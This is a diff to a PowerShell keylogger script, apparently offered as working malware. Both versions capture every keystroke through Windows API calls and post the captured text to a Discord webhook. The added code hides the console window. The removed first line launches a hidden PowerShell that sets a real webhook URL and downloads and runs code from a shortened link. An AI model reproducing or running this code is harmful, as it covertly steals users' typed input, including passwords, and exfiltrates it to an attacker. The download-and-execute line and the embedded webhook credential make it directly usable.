@@ -1,10 +1,21 @@
-Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoP -Ep Bypass -C `$dc='https://discord.com/api/webhooks/1349127152582525018/MesbCMKY4JaQceGiH2gvJ-afwmxp6SiQc421d2xJqFHiOnIi7TWaWnfT7BTlUktDCa4J'; irm https://is.gd/lBI1od | iex"
+# Check if the Webhook URL is shortened, and if it is, resolve it
+if ($dc.Ln -ne 121) {
+    Write-Host "Shortened Webhook URL Detected.."
+    $dc = (irm $dc).url
+}
 
-# Add customizations
-$sessionID = [guid]::NewGuid().ToString() # Generate a unique session ID
-$computerName = $env:COMPUTERNAME
-$send = ""
-$KeypressCount = 0
+# Hide the PowerShell window
+$Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
+$Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
+$hwnd = (Get-Process -PID $pid).MainWindowHandle
+if ($hwnd -ne [System.IntPtr]::Zero) {
+    $Type::ShowWindowAsync($hwnd, 0)
+} else {
+    $Host.UI.RawUI.WindowTitle = 'hideme'
+    $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
+    $hwnd = $Proc.MainWindowHandle
+    $Type::ShowWindowAsync($hwnd, 0)
+}
 
 # Import DLL Definitions for keyboard inputs
 $API = @'
@@ -19,36 +30,46 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 '@
 $API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru
 
-# Stopwatch for intelligent sending
+# Add stopwatch for intelligent sending
 $LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
 $KeypressThreshold = [TimeSpan]::FromSeconds(10)
 
-# Continuous loop for keypress detection
+# Initialize $send to store keypresses
+$send = ""
+
+# Start a continuous loop
 While ($true) {
     $keyPressed = $false
     try {
+        # Start a loop that checks the time since last activity before the message is sent
         while ($LastKeypressTime.Elapsed -lt $KeypressThreshold) {
+            # Start the loop with 30 ms delay between keystate check
             Start-Sleep -Milliseconds 30
             for ($asc = 8; $asc -le 254; $asc++) {
+                # Get the key state (is any key currently pressed?)
                 $keyst = $API::GetAsyncKeyState($asc)
                 if ($keyst -eq -32767) {
+                    # Restart the inactivity timer
                     $keyPressed = $true
                     $LastKeypressTime.Restart()
                     $null = [console]::CapsLock
+                    # Translate the keycode to a letter
                     $vtkey = $API::MapVirtualKey($asc, 3)
+                    # Get the keyboard state and create stringbuilder
                     $kbst = New-Object Byte[] 256
                     $checkkbst = $API::GetKeyboardState($kbst)
                     $logchar = New-Object -TypeName System.Text.StringBuilder
-
+                    # Define the key that was pressed          
                     if ($API::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
+                        # Check for non-character keys
                         $LString = $logchar.ToString()
-                        if ($asc -eq 8) { $LString = "[BS]" }
+                        if ($asc -eq 8) { $LString = "[BKSP]" }
                         if ($asc -eq 13) { $LString = "[ENT]" }
                         if ($asc -eq 27) { $LString = "[ESC]" }
-                        if ($asc -eq 32) { $LString = "[SPC]" }
+                        if ($asc -eq 32) { $LString = "[Space]" }
 
+                        # Add the key to sending variable
                         $send += $LString
-                        $KeypressCount++
                     }
                 }
             }
@@ -56,23 +77,26 @@ While ($true) {
     }
     finally {
         If ($keyPressed) {
-            $timestamp = Get-Date -Format "HH:mm:ss"
-            $formattedMessage = "[$timestamp] [$sessionID] **$computerName**: $send (Keys: $KeypressCount)"
+            # Send the saved keys to a webhook
+            $escmsgsys = $send -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
+            $timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
+            $escmsg = $timestamp + " : " + '`' + $escmsgsys + '`'
+
+            # Create the JSON payload
             $jsonsys = @{
-                "username" = "$computerName"
-                "content"  = $formattedMessage
+                "username" = "$env:COMPUTERNAME"
+                "content"  = $escmsg
             } | ConvertTo-Json
 
-            # Send the message to Discord (real-time updates)
+            # Send the data to Discord webhook
             Invoke-RestMethod -Uri $dc -Method Post -ContentType "application/json" -Body $jsonsys
 
-            # Clear the message buffer and reset counter
+            # Reset log file and inactivity check
             $send = ""
-            $KeypressCount = 0
+            $keyPressed = $false
         }
     }
-
-    # Reset the stopwatch before restarting the loop
+    # Reset stopwatch before restarting the loop
     $LastKeypressTime.Restart()
     Start-Sleep -Milliseconds 10
 }
